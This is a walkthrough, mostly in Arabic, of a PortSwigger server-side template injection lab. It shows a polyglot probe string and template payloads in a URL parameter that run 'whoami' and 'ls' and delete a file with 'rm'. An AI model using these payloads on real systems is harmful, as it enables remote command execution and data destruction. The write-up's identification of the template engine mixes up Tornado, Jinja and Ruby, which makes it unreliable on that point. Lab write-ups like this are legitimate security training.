## Welcome, my friend. Today we will start the [2. SSTI lab](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic-code-context) in ```portswigger```
### Let's play this lab:

#### First, we navigate inside the browser
![image](https://github.com/user-attachments/assets/2bbd92b6-33a3-4bed-88db-10df1dc6ddda)

### اول خطوة هي اننا نتصفح الموقع ونرى ما هو مريب علشان نستغلها في اختراق ذلك التحدي. ,ومعانا حساب لنسجل عليه ```wiener:peter```:
![image](https://github.com/user-attachments/assets/8d29ed31-8eaa-47c1-828a-7ea65c4f2abe)

### نلاحظ وجود ```Preferred name``` بالاسفل هو ده لغز التحدي.لما نتصفح اكثر في الموقع هنلاحظ بلوج بيسمحلنا نضيف اي تعليقات سوف نضيف الكود اللي بيظهر رسالة خطأ لو الثغرة موجودة:

```
${{<%[%'"}}%\
```

![image](https://github.com/user-attachments/assets/e416e9f9-570d-4841-8797-b3966de9e216)
### الرسالة بتوضح وجود ثغرة وان المكتبة المستخدمة tornado.

### نبدأ نحقن كود زي ده علشان نشوف هيحصل تغير ولا لا
```
/?message=${{<%[%'"}}%\
```

![image](https://github.com/user-attachments/assets/5b3b1844-2811-4782-ab4b-d4035f756985)

### تم نسخ النصوص من غير اي مشاكل معنى ذلك ان الاستغلال تبع مكتبة معينة وليس من ضمن مكاتب بايثون مثل jinja ممكن تكون مثلا rupy. هنجرب الكود التالي ونشوف لو في اي تغيير:

```
/?message=<%= mohamed %>
```

![image](https://github.com/user-attachments/assets/4f438eda-bc7a-4516-9443-d9ab1fccb19f)

### جميل تم ظهور خطأ يشير ان المكتبة المستخدمة هي rupy. دلوقتي ممكن نبحث عن اكواد الحقن زي موقع hacktricks:
![image](https://github.com/user-attachments/assets/95a98468-f6d9-48d8-9061-d125c1851e79)


### هنستخدم ذلك الكود:

```
/?message=<%= system("whoami") %> #Execute code
```

![image](https://github.com/user-attachments/assets/17fffaea-6acb-4e06-8a92-e5d3bf6235bc)


### تم استغلال الكود ممكن نستخدم امر ls علشان نعرف المحتوى:


```
/?message=<%= system("ls") %> #Execute code
```

![image](https://github.com/user-attachments/assets/e7cf1ae7-f845-480a-bf96-12cef31b26dd)

### علشان نحل ذلك التحدي لازم نحذف ملف ```morale.txt```. هنستخدم ذلك الكود:
```
/?message=<%= system("rm morale.txt") %> #Execute code
```

![image](https://github.com/user-attachments/assets/10fe49b9-cbdd-479d-9fc7-be87aced9902)

## وهنا تم حل اللاب يا صديقي ;)





![6563e6979e46c15f_tumblr_inline_n7kbn3iqz41scrulr](https://github.com/user-attachments/assets/327e3cab-0dca-4505-b1c4-9f9bbbbf7e77)
